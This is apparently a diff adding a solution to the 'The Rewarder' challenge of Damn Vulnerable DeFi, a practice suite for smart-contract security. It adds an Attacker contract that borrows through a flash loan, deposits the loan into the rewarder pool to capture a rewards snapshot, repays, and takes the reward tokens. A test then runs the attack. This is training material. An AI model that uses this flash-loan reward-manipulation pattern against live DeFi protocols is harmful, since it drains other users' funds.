@@ -3,12 +3,86 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
+import "forge-std/console2.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
 import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
+import {ERC20} from "openzeppelin-contracts/token/ERC20/ERC20.sol";
+
+contract Attacker {
+    address payable public owner;
+    address payable public flashLoaner;
+    address payable public rewarderPool;
+
+    ERC20 public liquidityToken;
+    ERC20 public accountingToken;
+    ERC20 public rewardToken;
+
+    constructor(
+        address _flashLoaner,
+        address _rewarderPool,
+        address _liqToken,
+        address _accToken,
+        address _rewToken
+    ) {
+        owner = payable(msg.sender);
+        flashLoaner = payable(_flashLoaner);
+        rewarderPool = payable(_rewarderPool);
+
+        liquidityToken = ERC20(_liqToken);
+        accountingToken = ERC20(_accToken);
+        rewardToken = ERC20(_rewToken);
+
+        liquidityToken.approve(address(this), type(uint256).max);
+        liquidityToken.approve(address(flashLoaner), type(uint256).max);
+    }
+
+    function contractFlashLoan() public _ownerOnly {
+        address(flashLoaner).call(
+            abi.encodeWithSignature(
+                "flashLoan(uint256)",
+                liquidityToken.balanceOf(address(flashLoaner))
+            )
+        );
+    }
+
+    function receiveFlashLoan(uint256 _amount) external {
+        // Deposit into the rewarder pool
+        liquidityToken.approve(address(rewarderPool), type(uint256).max);
+        address(rewarderPool).call(
+            abi.encodeWithSignature("deposit(uint256)", _amount)
+        );
+
+        // Take a snapshot with our new accounting tokens
+        //address(rewarderPool).call(
+        //    abi.encodeWithSignature("distributeRewards()")
+        //);
+
+        // Withdraw the liqudity tokens back
+        address(rewarderPool).call(
+            abi.encodeWithSignature("withdraw(uint256)", _amount)
+        );
+
+        // Repay the loan
+        liquidityToken.transfer(address(flashLoaner), _amount);
+    }
+
+    modifier _ownerOnly() {
+        assert(msg.sender == owner);
+        _;
+    }
+
+    function withdraw() public _ownerOnly {
+        // Get all the rewards out
+        rewardToken.approve(address(owner), type(uint256).max);
+        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
+    }
+
+    fallback() external payable {}
+}
 
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
@@ -89,6 +163,24 @@ contract TheRewarder is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        Attacker attacker = new Attacker(
+            address(flashLoanerPool),
+            address(theRewarderPool),
+            address(theRewarderPool.liquidityToken()),
+            address(theRewarderPool.accToken()),
+            address(theRewarderPool.rewardToken())
+        );
+
+        while (!theRewarderPool.isNewRewardsRound()) {
+            console2.log("Warping 6 hours ...");
+            vm.warp(block.timestamp + 6 hours);
+        }
+        
+
+        attacker.contractFlashLoan();
+        attacker.withdraw();
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
